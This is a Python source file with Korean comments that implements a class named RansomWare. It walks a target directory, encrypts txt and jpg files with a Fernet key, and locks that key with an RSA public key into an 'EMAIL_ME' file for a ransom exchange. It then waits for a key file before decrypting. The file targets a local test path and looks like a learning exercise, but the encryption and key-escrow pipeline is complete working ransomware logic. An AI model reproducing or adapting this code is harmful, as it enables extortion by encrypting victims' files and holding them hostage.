import threading
from cryptography.fernet import Fernet #대상 시스템의 파일을 암호화/복호화
import os
import time
import datetime
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP
import base64

class RansomWare:

    #암호화할 확장자 
    file_exts=[
        "txt",
        "jpg",
    ]

    def __init__(self):
        self.key=None
        self.crypter=None
        self.publiv_key=None

        #절대경로로 생성
        #암호화할 대상 경로
        self.localRoot=r'/home/eunha/RansomWare/ransomware/localRoot/'

    
    # 데이터를 암호화하는 데 사용되는 [대칭 키]를 생성
    def generate_key(self):
        self.key=Fernet.generate_key()
        self.crypter=Fernet(self.key)

    
    # 생성한 [대칭 키]를 fernet_key.txt에 씀
    def write_key(self):
        with open('fernet_key.txt','wb') as f:
            f.write(self.key)


    # 우리 컴퓨터에서 생성된 PUBLIC ASYMMETRIC RSA 키를 사용하여 파일을 암호화/복호화하려면 피해자 컴퓨터에서 생성된 [SYMMETRIC KEY]를 암호화하세요. 
    # 나중에 PRIVATE KEY를 사용하여 대상 컴퓨터에서 파일 암호화/암호 해독에 사용되는 SYSMETRIC KEY를 해독할 수 있으므로 파일 등을 해독할 수 있습니다 ?
    def encrypt_fernet_key(self):
        with open('fernet_key.txt', 'rb') as fk:
            fernet_key=fk.read()
        
        with open('fernet_key.txt','wb') as f:
            #공개 키
            self.public_key=RSA.import_key(open('public.pem').read())
            public_crypter=PKCS1_OAEP.new(self.public_key)
            enc_fernet_key=public_crypter.encrypt(fernet_key)
            f.write(enc_fernet_key)
        
        # 암호화된 Fernet 키를 데스크탑에도 기록하여 이 파일을 암호화 해제하고 
        # 시스템/파일을 다시 가져올 수 있도록 합니다.
        with open(f'/home/eunha/RansomWare/EMAIL_ME.txt', 'wb') as fa:
            fa.write(enc_fernet_key)
        

        self.key = enc_fernet_key
        self.crypter = None


    #암호화 하는 함수. encrypted=True면 복호화
    def crypt_file(self, file_path, encrypted=False):
        with open(file_path, 'rb') as f:
            data=f.read()

            if not encrypted:
                print(data)

                _data=self.crypter.encrypt(data)
                print('> File 암호화')
                print(_data)
            
            else: 
                _data=self.crypter.decrypt(data)
                print('> File 복호화')
                print(_data)

        with open(file_path, 'wb') as fp:
            fp.write(_data)

    #파일 암호화 하는 함수  (피해자의 컴퓨터에 생성된 [대칭 키] 사용)
    def crypt_system(self, encrypted=False):
        system = os.walk(self.localRoot, topdown=True) #대상 경로
        for root, dir, files in system:
            for file in files:
                file_path = os.path.join(root, file)
                if not file.split('.')[-1] in self.file_exts:
                    continue
                if not encrypted:
                    self.crypt_file(file_path) #암호화 함수
                else:
                    self.crypt_file(file_path, encrypted=True)
    
    @staticmethod
    def what_is_bitcoin():
        pass

    #PUT_ME_ON_RansomWare.txt를 RansomWare 폴더에 배치하면 암호화가 풀린다.
    def put_me_on_desktop(self):
        print('started')
        while True:
            try:
                print('trying')
                with open('/home/eunha/RansomWare/PUT_ME_ON_RansomWare.txt','r') as f:
                    self.key = f.read()
                    self.crypter = Fernet(self.key)
                    self.crypt_system(encrypted=True)
                    print('decrypted') # Debugging/Testing
                    break
            except Exception as e:
                print(e)
                pass

            time.sleep(3)

            print('PUT_ME_ON_RansomWare.txt 확인해주세요')

def main():
    rw=RansomWare()
    rw.generate_key()
    rw.crypt_system()
    rw.write_key()
    rw.encrypt_fernet_key()

    thread = threading.Thread(target=rw.put_me_on_desktop)
    thread.start()
    print('> RansomWare: Target machine has been un-encrypted') # Debugging/Testing
    print('> RansomWare: Completed') # Debugging/Testing


if __name__=='__main__':
    main()